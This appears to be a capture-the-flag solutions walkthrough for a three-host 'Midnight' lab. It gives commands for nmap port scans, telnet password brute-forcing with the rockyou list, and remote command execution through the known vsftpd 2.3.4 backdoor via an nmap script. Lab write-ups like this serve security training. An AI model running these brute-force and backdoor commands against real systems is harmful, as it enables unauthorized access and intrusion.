# Solutions

## Midnight West
We can start out by browsing to the first IP given in a web browser, which will
show a webpage. View the source of this webpage to get access to the SSH
credentials for this box. Then, log in with:
```
ssh hacker@<IPaddr>
```

## Midnight South
The IP for this host can be found in the `midnight_notes.txt`
file in the homedir in Midnight West. Use nmap to find open ports:
```
sudo nmap -sS -F -Pn <IPaddr>
```
Notice that port 23 is open (telnet). Based on the notes listed, we know that
there's a user that's probably on this system named `mantic0re`. We'll try to
brute-force their login using nmap's telnet brute-force capabilities, and a
well known password list, the rockyou dump. You can get the rockyou list here:
http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
```
echo "mantic0re" > user.txt
wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
bunzip2 rockyou.txt.bz2
sudo nmap -p 23 --script telnet-brute --script-args 'userdb=user.txt,passdb=rockyou.txt' <IPaddr>
```
This will reveal the `mantic0re` user's password. You should now be able to log
into the "midnight south" host via telnet.

## Midnight Core
You can find the IP for this host inside `mantic0re`'s `.ssh/known_hosts` file.
There's a hint about this in the INSTRUCTIONS file that's in that user's
homedir. When a user SSHes to a host, a record of that host's IP is usually
left in this file, unless a user has turned on known-host-hashing, which many
do not do. We'll start with a portscan, as usual:
```
sudo nmap -sS -F -Pn <IPaddr>
```
This reveals two ports open, 21 for `ftp` and 22 for `ssh`. `mantic0re`'s
credentials don't appear to work here, so let's target the FTP service. We can
start with a version scan to find out what FTP server this is:
```
sudo nmap -sS -sV -p 21 <IPaddr>
```
This reveals that this is vsftpd 2.3.4. Some googling indicates that this
version of vsftpd was actually backdoored, and there's a script to exploit it
built into nmap. We can exploit this host with:
```
sudo nmap --script ftp-vsftpd-backdoor --script-args 'ftp-vsftpd-backdoor.cmd="ls /"' -p 21 <IPaddr>
```
By modifying the `ftp-vsftpd-backdoor.cmd` value, we can run new commands on
the "core" server, until we find the secret that `mantic0re`'s co-hacker has
left behind.

# Congratulations!
By completing this challenge, you have:

* Used realistic strategies to compromise machines (credential leakage,
  credential brute-forcing, and vulnerable version exploitation)
* Literally hacked the planet (by pwning hosts in the USA, Brazil, and South
  Korea)
